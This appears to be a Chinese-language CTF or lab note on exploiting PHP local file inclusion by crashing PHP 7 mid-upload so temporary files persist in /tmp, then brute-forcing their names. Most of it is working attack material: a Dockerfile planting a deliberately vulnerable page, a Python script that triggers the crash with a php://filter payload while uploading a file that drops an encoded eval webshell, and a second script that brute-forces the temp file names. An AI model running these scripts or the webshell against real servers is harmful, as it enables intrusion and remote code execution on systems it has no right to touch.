参考：
- https://www.jianshu.com/p/dfd049924258

php中上传文件，会创建临时文件。在linux下使用/tmp目录，而在windows下使用c:\winsdows\temp目录。在临时文件被删除之前，利用竞争即可包含该临时文件。

[利用core dumped错误可以实现](PHP7的2个core_dumped错误.md)

参考：
- https://chybeta.github.io/2017/10/08/php%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/

### 环境

因为php在最新的php7.X中都进行修复了。所以我们从php官网手动下载php小版本进行测试。
所以就用Docker制作了php7210的环境然后commit并push到dockerhub上了，名字为：`j7ur8/php7012_apache2:origin`
```bash
FROM j7ur8/php7012_apache2:origin

RUN rm  /usr/local/apache2/htdocs/index.php


RUN echo 'PD9waHAKICAoJF89QCRfR0VUWydvcmFuZ2UnXSkgJiYgQHN1YnN0cihmaWxlKCRfKVswXSwwLDYpID09PSAnQDw/cGhwJyA/IGluY2x1ZGUoJF8pIDogaGlnaGxpZ2h0X2ZpbGUoX19GSUxFX18pOw==' | base64 -d > /usr/local/apache2/htdocs/index.php
RUN chmod -R 777 /usr/local/apache2/htdocs

CMD /usr/local/apache2/bin/apachectl -k start & /bin/bash -c "while true;do echo hello docker;sleep 1;done"
```

### 利用

![](/images/19-6-15_PHP_包含临时文件1.png)
利用思路就是在文件上传时，使php停止运行。这时就不会删除临时文件。而生成的临时文件的数量是可控的。所以我们可以通过爆破得到shell文件。

作者写的利用脚本
```py
import requests
import string

charset = string.digits + string.letters

host = "172.20.10.5"
port = 82
base_url = "http://%s:%d" % (host, port)


def upload_file_to_include(url, file_content):
    files = {'file': ('evil.jpg', file_content, 'image/jpeg')}
    try:
        response = requests.post(url, files=files)
    except Exception as e:
        print e


def generate_tmp_files():
    webshell_content = '<?php eval($_REQUEST[c]);?>'.encode(
        "base64").strip().encode("base64").strip().encode("base64").strip()
    file_content = '<?php if(file_put_contents("/tmp/ssh_session_HD89q2", base64_decode("%s"))){echo "flag";}?>' % (
        webshell_content)
    phpinfo_url = base_url+"/index.php?orange=php://filter/convert.quoted-printable-encode/resource=data://,%bfAAAAAAAAFAAAAAAAAAAAAAA%ff%ff%ff%ff%ff%ff%ff%ffAAAAAAAAAAAAAAAAAAAAAAAA"
    length = 6
    times = len(charset) ** (length / 2)
    for i in xrange(times):
        print "[+] %d / %d" % (i, times)
        upload_file_to_include(phpinfo_url, file_content)


def main():
    generate_tmp_files()


if __name__ == "__main__":
    main()
```

爆破文件名
```python
#!/usr/bin/env python
# -*- coding: utf-8 -*-

import requests
import string

charset = string.digits + string.letters

host = "172.20.10.5"
port = 82
base_url = "http://%s:%d" % (host, port)


def brute_force_tmp_files():
    for i in charset:
        for j in charset:
            for k in charset:
                for l in charset:
                    for m in charset:
                        for n in charset:
                            filename = i + j + k + l + m + n
                            url = "%s/index.php?orange=/tmp/php%s" % (
                                base_url, filename)
                            print url
                            try:
                                response = requests.get(url)
                                if 'flag' in response.content:
                                    print "[+] Include success!"
                                    return True
                            except Exception as e:
                                print e
    return False


def main():
    brute_force_tmp_files()

if __name__ == "__main__":
    main()
```